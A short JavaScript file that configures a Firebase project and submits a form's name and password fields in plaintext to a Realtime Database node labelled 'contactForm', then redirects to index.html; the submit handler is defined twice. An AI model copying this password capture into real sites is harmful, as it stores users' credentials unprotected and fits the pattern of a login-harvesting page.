

 const firebaseConfig = {
   apiKey: "AIzaSyAdcVisv6TeSWSD5juhKcdtYaCDPEcgcxc",
   authDomain: "ecommerce1-cde47.firebaseapp.com",
   databaseURL: "https://ecommerce1-cde47-default-rtdb.firebaseio.com",
   projectId: "ecommerce1-cde47",
   storageBucket: "ecommerce1-cde47.firebasestorage.app",
   messagingSenderId: "534290023487",
   appId: "1:534290023487:web:d325ad602d7a5246cf248a",
   measurementId: "G-21M4PK4FJY"
 };



  firebase.initializeApp(firebaseConfig);
  
  var contactFormDB = firebase.database().ref("contactForm");
  
  document.getElementById("contactForm").addEventListener("submit", submitForm);
  
  function submitForm(e) {
    e.preventDefault();
  
    var name = getElementVal("name");
    var password = getElementVal("password");
    saveMessages(name, password);
  
 
    document.getElementById("contactForm").reset();
  }
  
  const saveMessages = (name, password) => {
    var newContactForm = contactFormDB.push();
  
    newContactForm.set({
      name: name,
      password: password,
    });
  };
  
  const getElementVal = (id) => {
    return document.getElementById(id).value;
  };




  function submitForm(e) {
    e.preventDefault();

    var name = getElementVal("name");
    var password = getElementVal("password");

    saveMessages(name, password);

    // Redirect to index.html after saving
    window.location.href = "index.html";

    document.getElementById("contactForm").reset();
}